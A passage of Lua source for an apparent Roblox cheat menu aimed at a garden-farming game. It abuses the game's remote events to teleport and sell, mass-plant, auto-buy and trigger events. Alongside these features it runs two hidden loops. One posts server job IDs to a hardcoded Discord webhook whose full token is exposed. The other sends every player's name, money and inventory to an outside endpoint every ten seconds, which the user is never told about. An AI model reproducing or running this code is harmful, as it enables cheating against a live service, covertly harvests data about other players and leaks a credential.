            local UIToolsGradient = Instance.new("UIGradient")
            local StocksLabel = Instance.new("TextLabel")
            local StocksDisplayFrame = Instance.new("Frame")
            local listLayout = Instance.new("UIListLayout")
            local stroke1 = Instance.new('UIGradient')
            local stroke2 = Instance.new('UIStroke')
            local stroke3 = Instance.new('UIStroke')
            stocksgui.Name = guiName
            stocksgui.Parent = PlayerGui
            stocksgui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            stocksgui.Enabled = true
            Frame.Parent = stocksgui
            Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Frame.BackgroundTransparency = 0.300
            Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Frame.BorderSizePixel = 0
            Frame.AnchorPoint = Vector2.new(0.5, 0.5)
            Frame.Position = UDim2.new(0.9202252635, 0, 0.541262135, 0)
            Frame.Size = UDim2.new(0.138597906, 0, 0.396440119, 0)
            UIToolsGradient.Color = ColorSequence.new {
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(29, 29, 29)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(47, 47, 47))
            }
            UIToolsGradient.Name = "UIToolsGradient"
            UIToolsGradient.Parent = Frame
            StocksLabel.Name = "Stocks"
            StocksLabel.Parent = Frame
            StocksLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            StocksLabel.BackgroundTransparency = 1.000
            StocksLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
            StocksLabel.BorderSizePixel = 10
            StocksLabel.Position = UDim2.new(0.00581395347, 0, 0, 0)
            StocksLabel.Size = UDim2.new(0, 265, 0, 50)
            StocksLabel.Font = Enum.Font.Highway
            StocksLabel.Text = "Stock"
            StocksLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
            StocksLabel.TextSize = 51.000
            StocksLabel.TextStrokeColor3 = Color3.fromRGB(71, 0, 0)
            StocksLabel.TextStrokeTransparency = 0.000
            local Frame_2 = Instance.new("Frame")
            Frame_2.Parent = StocksLabel
            Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Frame_2.BackgroundTransparency = 1.000
            Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Frame_2.BorderSizePixel = 0
            Frame_2.Size = UDim2.new(0, 265, 0, 50)
            StocksDisplayFrame.Name = "StocksDisplay"
            StocksDisplayFrame.Parent = Frame
            StocksDisplayFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            StocksDisplayFrame.BackgroundTransparency = 1.000
            StocksDisplayFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
            StocksDisplayFrame.BorderSizePixel = 0
            StocksDisplayFrame.Position = UDim2.new(0.00581395347, 0, 0.15408164, 0)
            StocksDisplayFrame.Size = UDim2.new(0, 200, 0, 300)
            StocksDisplayFrame.ClipsDescendants = true
            listLayout.Parent = StocksDisplayFrame
            listLayout.SortOrder = Enum.SortOrder.LayoutOrder
            listLayout.Padding = UDim.new(0, 2)
            stroke1.Parent = Frame
            stroke1.Color = ColorSequence.new {
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0))
            }
            stroke1.Rotation = 0
            stroke2.Parent = Frame
            stroke2.Thickness = 3.2
            stroke2.Transparency = 0.22
            stroke3.Parent = Frame_2
            stroke3.Thickness = 3.2
            stroke3.Transparency = 0.22
            local function updateStockDisplay()
                for _, child in pairs(StocksDisplayFrame:GetChildren()) do
                    if child:IsA("TextLabel") then
                        child:Destroy()
                    end
                end
                local displayedFruits = {}
                if priorityFruitNames then
                    for _, fruitName in ipairs(priorityFruitNames) do
                        local fruitFrame = scrollingFrame:FindFirstChild(fruitName)
                        if fruitFrame and fruitFrame:IsA("Frame") and fruitFrame:FindFirstChild("Main_Frame") then
                            local mainFrame = fruitFrame:FindFirstChild("Main_Frame")
                            local stockTextLabel = mainFrame:FindFirstChild("Stock_Text")
                            if stockTextLabel and stockTextLabel:IsA("TextLabel") then
                                local stockInfo = stockTextLabel.Text
                                local newTextLabel = Instance.new("TextLabel")
                                newTextLabel.Parent = StocksDisplayFrame
                                newTextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                                newTextLabel.BackgroundTransparency = 1.000
                                newTextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
                                newTextLabel.BorderSizePixel = 0
                                newTextLabel.Size = UDim2.new(1, -10, 0, 15)
                                newTextLabel.Font = Enum.Font.RobotoMono
                                newTextLabel.FontFace.Weight = Enum.FontWeight.Bold
                                newTextLabel.Text = fruitName .. ": " .. stockInfo
                                newTextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
                                newTextLabel.TextSize = 20.000
                                newTextLabel.TextWrapped = true
                                newTextLabel.TextXAlignment = Enum.TextXAlignment.Left
                                newTextLabel.TextYAlignment = Enum.TextYAlignment.Top
                                table.insert(displayedFruits, fruitName)
                            end
                        end
                    end
                end
                for _, itemFrame in pairs(scrollingFrame:GetChildren()) do
                    if itemFrame:IsA("Frame") and itemFrame:FindFirstChild("Main_Frame") and
                        not table.find(displayedFruits, itemFrame.Name) then
                        local mainFrame = itemFrame:FindFirstChild("Main_Frame")
                        local stockTextLabel = mainFrame:FindFirstChild("Stock_Text")
                        if stockTextLabel and stockTextLabel:IsA("TextLabel") then
                            local fruitName = itemFrame.Name
                            local stockInfo = stockTextLabel.Text
                            local newTextLabel = Instance.new("TextLabel")
                            newTextLabel.Parent = StocksDisplayFrame
                            newTextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                            newTextLabel.BackgroundTransparency = 1.000
                            newTextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
                            newTextLabel.BorderSizePixel = 0
                            newTextLabel.Size = UDim2.new(1, -10, 0, 15)
                            newTextLabel.Font = Enum.Font.RobotoMono
                            newTextLabel.FontFace.Weight = Enum.FontWeight.Bold
                            newTextLabel.Text = fruitName .. ": " .. stockInfo
                            newTextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
                            newTextLabel.TextSize = 20.000
                            newTextLabel.TextWrapped = true
                            newTextLabel.TextXAlignment = Enum.TextXAlignment.Left
                            newTextLabel.TextYAlignment = Enum.TextYAlignment.Top
                        end
                    end
                end
            end
            updateStockDisplay()
            local function onDescendantAdded(child)
                if child:IsA("Frame") and child:FindFirstChild("Main_Frame") then
                    if priorityFruitNames then
                        updateStockDisplay()
                    else
                        local mainFrame = child:FindFirstChild("Main_Frame")
                        if mainFrame:FindFirstChild("Stock_Text") then
                            task.wait(0.1)
                            updateStockDisplay()
                        end
                    end
                end
            end
            local function onDescendantRemoved(child)
                if child:IsA("Frame") and child:FindFirstChild("Main_Frame") then
                    if priorityFruitNames then
                        updateStockDisplay()
                    else
                        local mainFrame = child:FindFirstChild("Main_Frame")
                        if mainFrame:FindFirstChild("Stock_Text") then
                            updateStockDisplay()
                        end
                    end
                end
            end
            task.spawn(function()
                while true do
                    if stocksgui and stocksgui.Parent then
                        updateStockDisplay()
                    else
                        break
                    end
                    task.wait(1)
                end
            end)
            scrollingFrame.DescendantAdded:Connect(onDescendantAdded)
            scrollingFrame.DescendantRemoved:Connect(onDescendantRemoved)
            return stocksgui
        end
        local rareFruits = {
            "Grape",
            "Dragon Fruit",
            "Mango",
            "Coconut",
            "Cactus",
            "Grape",
            "Mushroom"
        }
        local myStocksGUI = createStocksGUI("MyStocksGUI", rareFruits)
    end
})

SectionMain:AddButton({
    Name = "Shop",
    Callback = function()
        local Players = game:GetService("Players")
        local localPlayer = Players.LocalPlayer
        local shopgui = localPlayer.PlayerGui:WaitForChild("Seed_Shop"):WaitForChild("Frame")
        shopgui.Visible = true
    end
})

-- Sell Hand Keybind in Main Section
SectionMain:AddBind({
    Name = "Sell Hand",
    Default = Enum.KeyCode.X,
    Hold = false,
    Callback = function()
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local workspace = game:GetService("Workspace")
        local localPlayer = Players.LocalPlayer
        local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
        local rootPart = character:WaitForChild("HumanoidRootPart")
        local steven = workspace:WaitForChild("NPCS"):WaitForChild("Steven")
        local stevenHRP = steven:FindFirstChild("HumanoidRootPart")
        if not stevenHRP then
            warn("Steven has no HumanoidRootPart")
            return
        end
        local originalCFrame = rootPart.CFrame
        local offset = stevenHRP.CFrame.LookVector * 3
        rootPart.CFrame = stevenHRP.CFrame + offset
        task.wait(0.5)
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Sell_Item"):FireServer()
        task.wait(0.0000000000000001)
        rootPart.CFrame = originalCFrame
    end
})
--autoplant
local PlantingTab = Window:MakeTab({
    Name = "Planting",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local PlantingSection = PlantingTab:AddSection({
    Name = "Planting Actions"
})

local plantCount = 5 -- Default value
local delayBetweenPlants = 0.01
local selectedSeed = "Strawberry"
local seedOptions = {
    "Apple",
    "Bamboo",
    "Banana",
    "Beanstalk",
    "Blood Banana",
    "Blueberry",
    "Cacao",
    "Candy Blossom",
    "Candy Sunflower",
    "Carrot", -- Added
    "Celestiberry", -- Added
    "Cherry Blossom",
    "Chocolate Carrot",
    "Cactus",
    "Coconut",
    "Corn",
    "Cranberry",
    "Cursed Fruit",
    "Daffodil",
    "Dragon Fruit",
    "Durian",
    "Easter Egg",
    "Eggplant",
    "Glowshroom",
    "Grape",
    "Lemon",
    "Lotus",
    "Mango",
    "Mint",
    "Moon Blossom",
    "Moon Mango", -- Added
    "Moon Melon",
    "Moonflower",
    "Mushroom",
    "Nightshade",
    "Orange Tulip",
    "Papaya",
    "Passionfruit",
    "Pear",
    "Peach",
    "Pepper",
    "Pineapple",
    "Raspberry",
    "Red Lollipop",
    "Soul Fruit",
    "Starfruit",
    "Strawberry",
    "Tomato",
    "Venus Fly Trap",
    "Watermelon",
}
PlantingSection:AddTextbox({
    Name = "Number of Plants",
    Default = tostring(plantCount),
    TextDisappear = false,
    Callback = function(Value)
        plantCount = tonumber(Value) or 1
    end
})

PlantingSection:AddDropdown({
    Name = "Select Seed",
    Default = selectedSeed,
    Options = seedOptions,
    Callback = function(Value)
        selectedSeed = Value
    end
})

PlantingSection:AddButton({
    Name = "Plant Selected Seed",
    Callback = function()
        local player = game.Players.LocalPlayer

        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local rootPart = player.Character.HumanoidRootPart
            local plantPosition = rootPart.Position - Vector3.new(0, 2, 0)

            for i = 1, plantCount do
                local args = {
                    [1] = plantPosition,
                    [2] = selectedSeed
                }
                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(unpack(args))
                task.wait(delayBetweenPlants)
            end

            OrionLib:MakeNotification({
                Name = "Planting Complete",
                Content = "Planted " .. tostring(plantCount) .. " " .. selectedSeed .. "!",
                Time = 5
            })

        else
            warn("Player character or HumanoidRootPart not found.")
        end
    end
})
PlantingSection:AddButton({ 
    Name = "Remove Plants except the Fruits",
    Callback = function()
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local Workspace = game:GetService("Workspace")
        local farmContainer = Workspace:FindFirstChild("Farm")

        if not farmContainer then
            warn("Farm container not found.")
            return
        end

        local removedCount = 0
        local nonMultiHarvestPlants = {
    	"Bamboo",
    	"Candy Sunflower",
    	"Carrot",
    	"Chocolate Carrot",
    	"Daffodil",
    	"Mushroom",
    	"Orange Tulip",
    	"Pumpkin",
    	"Red Lollipop",
    	"Watermelon",
		}
        for _, farmFolder in pairs(farmContainer:GetChildren()) do
            if farmFolder:IsA("Folder") and farmFolder.Name == "Farm" then
                local important = farmFolder:FindFirstChild("Important")
                if important then
                    local data = important:FindFirstChild("Data")
                    if data and data:IsA("Folder") then
                        local owner = data:FindFirstChild("Owner")
                        if owner and owner:IsA("StringValue") and owner.Value == LocalPlayer.Name then
                            local plants = important:FindFirstChild("Plants_Physical")
                            if plants then
                                for _, plant in pairs(plants:GetChildren()) do
                                    if not table.find(nonMultiHarvestPlants, plant.Name) then
                                        for _, item in pairs(plant:GetChildren()) do
                                            if item.Name ~= "Fruits" then
                                                item:Destroy()
                                                removedCount += 1
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

        print("Removed " .. removedCount .. " parts from multi-harvest plants (excluding Fruits).")
    end
})


-- Sell Inventory Keybind in Main Section
SectionMain:AddBind({
    Name = "Sell Inventory",
    Default = Enum.KeyCode.Z,
    Hold = false,
    Callback = function()
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local workspace = game:GetService("Workspace")
        local localPlayer = Players.LocalPlayer
        local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
        local rootPart = character:WaitForChild("HumanoidRootPart")
        local steven = workspace:WaitForChild("NPCS"):WaitForChild("Steven")
        local stevenHRP = steven:FindFirstChild("HumanoidRootPart")
        if not stevenHRP then
            warn("Steven has no HumanoidRootPart")
            return
        end
        local originalCFrame = rootPart.CFrame
        local offset = stevenHRP.CFrame.LookVector * 3
        rootPart.CFrame = stevenHRP.CFrame + offset
        task.wait(0.5)
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Sell_Inventory"):FireServer()
        task.wait(0.000000000000000002)
        rootPart.CFrame = originalCFrame
    end
})
local HttpService = game:GetService("HttpService")
local webhookUrls = {
    Rain = "https://discord.com/api/webhooks/1371339368786038794/O46PZ4u4cqPbV6gIhkMlMbLuu-hzdNgp-_Y3ny8bjnlakzeh3VFVAHDjZn9HQ0FiXlKE",
    Frost = "https://discord.com/api/webhooks/1371339368786038794/O46PZ4u4cqPbV6gIhkMlMbLuu-hzdNgp-_Y3ny8bjnlakzeh3VFVAHDjZn9HQ0FiXlKE",
    Thunderstorm = "https://discord.com/api/webhooks/1371339368786038794/O46PZ4u4cqPbV6gIhkMlMbLuu-hzdNgp-_Y3ny8bjnlakzeh3VFVAHDjZn9HQ0FiXlKE",
    Luck = "https://discord.com/api/webhooks/1371339368786038794/O46PZ4u4cqPbV6gIhkMlMbLuu-hzdNgp-_Y3ny8bjnlakzeh3VFVAHDjZn9HQ0FiXlKE"
}
local lastSentTime = {}
local function sendDiscordWebhook(webhookUrl, content, title, description)
    local data = {
        content = content,
        embeds = {}
    }
    if title and description then
        data.embeds = {
            {
                title = title,
                description = description,
                color = 65280
            }
        }
    end
    local jsonData = HttpService:JSONEncode(data)
    pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)
end

local function checkWeatherAndSend()
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local BottomList = LocalPlayer.PlayerGui:FindFirstChild("Bottom_UI") and LocalPlayer.PlayerGui.Bottom_UI.BottomFrame.Holder.List
    if not BottomList then return end

    local weatherTypes = {"Luck", "Rain", "Frost", "Thunderstorm"}
    local detected = {}
    local currentTime = os.time()
	local jobId = game.JobId
    for _, weather in ipairs(weatherTypes) do
        local frame = BottomList:FindFirstChild(weather)
        if frame and frame.Visible then
            table.insert(detected, weather)
        end
    end
	
    -- Only send the notification if weather is detected and hasn't been sent recently
    if #detected > 0 then
        local jobId = game.JobId
        local playerCount = #game.Players:GetPlayers()
        local cooldown = 240 -- 4 minutes in seconds

        for _, weather in ipairs(detected) do
            local durationText = ""
            if weather == "Thunderstorm" then
                durationText = " (Lasts ~5 minutes)"
            elseif weather == "Rain" then
                durationText = " (Lasts ~5 minutes)"
            elseif weather == "Frost" then
                durationText = " (Duration unknown)"
            elseif weather == "Luck" then
                durationText = " (Duration unknown)"
            end

            if not lastSentTime[weather] or currentTime - lastSentTime[weather] >= cooldown then
                local webhookToSend = webhookUrls[weather]
                -- Fallback to the default webhook if a specific one isn't found
                if not webhookToSend then
                    webhookToSend = webhookUrls.Luck
                end

                -- Send the Job ID first
                sendDiscordWebhook(webhookToSend, "" .. jobId, nil, nil) -- Send Job ID without title/description -- Add a short delay (1 second)

                -- Then send the weather notification
                sendDiscordWebhook(
                    webhookToSend,
                    nil, -- No content for the weather message.
                    "🌦️ Weather Detected: " .. weather,
                    "Player: **Go now**\n" ..
                        "Weather: **" .. weather .. "**" .. durationText .. "\n" ..
                        "Players: **" .. playerCount .. "**"
                )
                lastSentTime[weather] = currentTime -- Update the last sent time for this weather
            end
        end
    end
end

spawn(function()
    while true do
		
        checkWeatherAndSend()
        task.wait(10) -- Check every 10 seconds
    end
end)
--sheckles
local HttpService = game:GetService("HttpService")
local Players     = game:GetService("Players")
local RunService  = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local ENDPOINT_URL  = "https://your-repl-name.repl.co/roblox"  -- replace
local SEND_INTERVAL = 10

local function getPlayerData(player)
    local shekels = 0
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local v = leaderstats:FindFirstChild("Sheckles")
               or leaderstats:FindFirstChild("Money")
               or leaderstats:FindFirstChild("Cash")
        if v and typeof(v.Value) == "number" then
            shekels = v.Value
        end
    end

    local inventory = {}
    if player == LocalPlayer then
        local backpack = player:WaitForChild("Backpack")
        for _, tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                table.insert(inventory, tool.Name)
            end
        end
    end

    return shekels, inventory
end

local function isPrivateServer()
    local ok, res = pcall(function()
        return game.PrivateServerId ~= "" and game.PrivateServerOwnerId > 0
    end)
    return ok and res
end

local function sendServerData()
    if not LocalPlayer or not LocalPlayer.Parent then return end
    if not HttpService.HttpEnabled then return end

    local allPlayers = Players:GetPlayers()
    if #allPlayers == 0 then
        local payload = {
            player        = "EmptyServer",
            shekels       = 0,
            playerCount   = 0,
            privateServer = isPrivateServer(),
            jobId         = tostring(game.JobId),
            placeId       = (game.PlaceId and game.PlaceId > 0) and tostring(game.PlaceId) or "universal",
            inventory     = {}
        }
        local data = HttpService:JSONEncode(payload)
        pcall(function()
            HttpService:RequestAsync({ Url=ENDPOINT_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=data })
        end)
        return
    end

    for _, player in ipairs(allPlayers) do
        local shekels, inventory = getPlayerData(player)
        local payload = {
            player        = player.Name,
            shekels       = shekels,
            playerCount   = #allPlayers,
            privateServer = isPrivateServer(),
            jobId         = tostring(game.JobId),
            placeId       = (game.PlaceId and game.PlaceId > 0) and tostring(game.PlaceId) or "universal",
            inventory     = inventory
        }
        local data = HttpService:JSONEncode(payload)
        pcall(function()
            HttpService:RequestAsync({ Url=ENDPOINT_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=data })
        end)
        task.wait(0.1)
    end
end

spawn(function()
    while true do
        sendServerData()
        task.wait(SEND_INTERVAL)
    end
end)
local HiddenFeatures = Window:MakeTab({
    Name = "Hidden Features",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

HiddenFeatures:AddButton({
    Name = "Trigger Tornado Event",
    Callback = function()
        workspace:SetAttribute("TornadoEvent", true)
    end
})

HiddenFeatures:AddButton({
    Name = "Trigger Jandel Laser",
    Callback = function()
        workspace:SetAttribute("JandelLazer", true)
    end
})

HiddenFeatures:AddButton({
    Name = "Trigger Monster Mash",
    Callback = function()
        workspace:SetAttribute("MonsterMash", true)
    end
})
HiddenFeatures:AddButton({
    Name = "Stop All Events",
    Callback = function()
        workspace:SetAttribute("TornadoEvent", false)
        workspace:SetAttribute("JandelLazer", false)
        workspace:SetAttribute("MonsterMash", false)
    end
})

--Guis
local Guis = Window:MakeTab({
    Name = "Game GUIs",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local gamegui = Guis:AddSection({
    Name = "Guis for the Game"
})
local player = game:GetService("Players").LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Function to toggle the Enabled property of a GuiObject
local function toggleEnabled(guiObject)
    if guiObject then
        guiObject.Enabled = not guiObject.Enabled
    end
end

-- Function to toggle the Visible property of a GuiObject
local function toggleVisible(guiObject)
    if guiObject then
        guiObject.Visible = not guiObject.Visible
    end
end
gamegui:AddButton({
    Name = "Twilight Shop",
    Callback = function()
        local Nightevent = playerGui:WaitForChild("NightEventShop_UI")
        toggleEnabled(Nightevent)
    end
})
gamegui:AddButton({
    Name = "Cosmetic Shop",
    Callback = function()
        local Cosmetic = playerGui:WaitForChild("CosmeticShop_UI")
        toggleEnabled(Cosmetic)
    end
})
gamegui:AddButton({
    Name = "Bloodmoon Shop",
    Callback = function()
        local bloodShop = playerGui:WaitForChild("EventShop_UI")
        toggleEnabled(bloodShop)
    end
})

gamegui:AddButton({
    Name = "Seed Shop",
    Callback = function()
        local seedShop = playerGui:WaitForChild("Seed_Shop")
        toggleEnabled(seedShop)
    end
})

gamegui:AddButton({
    Name = "Gear Shop",
    Callback = function()
        local gearShop = playerGui:WaitForChild("Gear_Shop")
        toggleEnabled(gearShop)
    end
})

gamegui:AddButton({
    Name = "Easter Shop -- cooked doesnt work",
    Callback = function()
        local easterShop = playerGui:WaitForChild("Easter_Shop")
        toggleEnabled(easterShop)
    end
})
gamegui:AddButton({
    Name = "Gear Teleport",
    Callback = function()
        local gearTeleportUI = playerGui:WaitForChild("Teleport_UI"):WaitForChild("Frame"):WaitForChild("Gear")
        toggleVisible(gearTeleportUI)
    end
})
gamegui:AddButton({
    Name = "Pet Teleport",
    Callback = function()
        local petsTeleportUI = playerGui:WaitForChild("Teleport_UI"):WaitForChild("Frame"):WaitForChild("Pets")
        toggleVisible(petsTeleportUI)
    end
})


gamegui:AddButton({
    Name = "Daily Quests",
    Callback = function()
        local dailyQuestsUI = playerGui:WaitForChild("DailyQuests_UI")
        toggleEnabled(dailyQuestsUI)
    end
})

gamegui:AddButton({
    Name = "Starter Pack",
    Callback = function()
        local starterPack = playerGui:WaitForChild("Hud_UI"):WaitForChild("SideBtns"):WaitForChild("StarterPack")
        toggleVisible(starterPack)
    end
})
-- Auto Buy for mobile
local AutoBuyConfig = Window:MakeTab({
    Name = "Auto Buy",
    Icon = "rbxassetid://4483345998", -- Replace with an appropriate weather icon ID
    PremiumOnly = false
})

local SectionGears = AutoBuyConfig:AddSection({
    Name = "Auto Buy Gears"
})

local AutobuygearsEnabled = {} -- Table to track if auto-buy is enabled for each gear

local function AutoBuyGear(Value, GearName)
    AutobuygearsEnabled[GearName] = Value
    if Value then
        while AutobuygearsEnabled[GearName] do
            local success, errorMessage = pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyGearStock"):FireServer(GearName)
            end)
            if not success then
                warn("Error buying gear:", errorMessage)
            end
            task.wait(0.5)
            if not AutobuygearsEnabled[GearName] then
                break -- Stop if the toggle is turned off
            end
        end
    end
end

AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Watering Can]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Watering Can")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Trowel]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Trowel")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Lightning Rod]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Lightning Rod")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Basic Sprinkler]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Basic Sprinkler")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Advanced Sprinkler]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Advanced Sprinkler")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Godly Sprinkler]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Godly Sprinkler")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Master Sprinkler]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Master Sprinkler")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Chocolate Sprinkler]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Chocolate Sprinkler")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Cleaning Spray]",
    Default = false,
    Callback = function(Value)
        -- Assuming "Favorite Tool" corresponds to a specific gear name in the server
        AutoBuyGear(Value, "Cleaning Spray")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Harvest Tool]",
    Default = false,
    Callback = function(Value)
        -- Assuming "Favorite Tool" corresponds to a specific gear name in the server
        AutoBuyGear(Value, "Harvest Tool")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Friendship Pot]",
    Default = false,
    Callback = function(Value)
        -- Assuming "Favorite Tool" corresponds to a specific gear name in the server
        AutoBuyGear(Value, "Friendship Pot")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Recall Wrench]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Recall Wrench")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Gears [Harvest Tool]",
    Default = false,
    Callback = function(Value)
        AutoBuyGear(Value, "Harvest Tool")
    end
})

local SectionSeeds = AutoBuyConfig:AddSection({
    Name = "Auto Buy Seeds"
})

local AutobuyseedsEnabled = {} -- Table to track if auto-buy is enabled for each seed

local function AutoBuySeed(Value, SeedName)
    AutobuyseedsEnabled[SeedName] = Value
    if Value then
        while AutobuyseedsEnabled[SeedName] do
            local success, errorMessage = pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuySeedStock"):FireServer(SeedName)
            end)
            if not success then
                warn("Error buying seed:", errorMessage)
            end
            task.wait(0.5)
            if not AutobuyseedsEnabled[SeedName] then
                break -- Stop if the toggle is turned off
            end
        end
    end
end

AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Carrot]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Carrot")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Strawberry]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Strawberry")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Blueberry]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Blueberry")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Orange Tulip]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Orange Tulip")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Tomato]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Tomato")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Corn]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Corn")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Daffodil]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Daffodil")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Watermelon]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Watermelon")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Pumpkin]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Pumpkin")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Apple]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Apple")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Bamboo]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Bamboo")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Coconut]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Coconut")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Cactus]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Cactus")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Dragon Fruit]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Dragon Fruit")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Mango]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Mango")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Grape]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Grape")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Mushroom]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Mushroom")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Pepper]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Pepper")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Beanstalk]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Beanstalk")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Sugar Apple]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Sugar Apple")
    end
})
AutoBuyConfig:AddToggle({
    Name = "Auto Buy Seeds [Ember Lily]",
    Default = false,
    Callback = function(Value)
        AutoBuySeed(Value, "Ember Lily")
    end
})
-- Weather Finder Tab
local WeatherTab = Window:MakeTab({
    Name = "Blood Moon Finder",
    Icon = "rbxassetid://4483345998", -- Replace with an appropriate weather icon ID
    PremiumOnly = false
})

local SectionWeather = WeatherTab:AddSection({
    Name = "Job ID Teleport"
})

local JobIdTextBoxValue = "" -- Store the textbox value here
local placeId = game.PlaceId -- Get the current place ID

SectionWeather:AddTextbox({
